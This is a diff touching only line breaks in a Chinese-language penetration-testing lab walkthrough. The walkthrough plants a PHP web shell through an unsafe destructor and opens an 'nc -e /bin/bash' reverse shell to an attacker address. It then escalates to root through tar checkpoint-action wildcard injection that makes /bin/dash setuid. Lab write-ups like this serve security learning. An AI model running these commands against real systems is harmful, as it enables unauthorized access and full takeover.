@@ -7549,7 +7549,7 @@
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598850111403-a68e0a6a-e1d4-4a79-ae0c-a9ca8b2d55ab-332237.png" /></p>
 <p>访问得到一个 js 一个 bak</p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598850154394-2d6486c8-2497-41ff-988d-2f379f8a27e7-468206.png" /></p>
-<p>访问下载
+<p>访问下载<br />
 是一个 Log 类，后面析构函数实现了把 data 写到 filename 里面</p>
 <pre><code class="language-php">public function __destruct()
 {
@@ -7565,10 +7565,10 @@
 <p>然后给 index.php 发过去，这样就在 scriptz 目录下生成一个 shell.php 的一句话</p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598862549181-344aabb9-421f-414f-8f77-24f657b3e5d2-260189.png" /></p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598862455627-3b72bbc1-39f3-4f4f-953d-e1facffa43a5-732505.png" /></p>
-<p>nc 反弹个 shell
+<p>nc 反弹个 shell<br />
 <code>http://192.168.149.199/scriptz/shell.php?cmd=nc -e /bin/bash 192.168.149.1 6666</code></p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598862661834-089eee9b-f774-45af-b802-f7ab955da62a-920478.png" /></p>
-<p>打开一个交互的 shell
+<p>打开一个交互的 shell<br />
 <code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
 <p>由于在 /home/rene/backup 目录下有一些备份文件，每分钟一个，所以可能有啥任务计划之类的</p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598871267482-c66d11f5-dc96-41f1-8f7a-7647f0bd6f53-088065.png" /></p>
@@ -7576,8 +7576,8 @@
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598871207594-27f16a15-a1ba-4182-afae-52ae4a4ab0d3-031824.png" /></p>
 <p>其中那个 /usr/bin/compress.sh 可以读到，看到他做了这么些事情</p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598871426039-75eab029-c82b-4df1-b006-c10a0220bf3d-742395.png" /></p>
-<p>这里用到了 tar 提权
-tar 选项中有一个 --checkpoint-action 当 --checkpoint-action=exec=command 时可以用来执行命令
+<p>这里用到了 tar 提权<br />
+tar 选项中有一个 --checkpoint-action 当 --checkpoint-action=exec=command 时可以用来执行命令<br />
 当 --checkpoint=1 时可以用来显示信息</p>
 <pre><code>echo &quot;&quot; &gt; --checkpoint-action=exec=sh\ shell.sh;
 echo &quot;&quot; &gt; --checkpoint=1;
@@ -7585,7 +7585,7 @@ echo 'chmod u+s /bin/dash' &gt; shell.sh
 chmod 777 shell.sh
 </code></pre>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598872665243-9e8e8523-64f6-4bad-87ab-f9bfd6c50776-060105.png" /></p>
-<p>然后等着 corn 运行 tar 就能拿到 shell
+<p>然后等着 corn 运行 tar 就能拿到 shell<br />
 看着他的 bak 文件多了然后再没了就差不多了</p>
 <p><img alt="image.png" src="../img/EczdXxuDHT14UGmd/1598872923394-5ed24da7-38a5-419d-8a48-5a1db8380b86-038777.png" /></p>
 <p>这时候 /bin/dash 就可以啦</p>
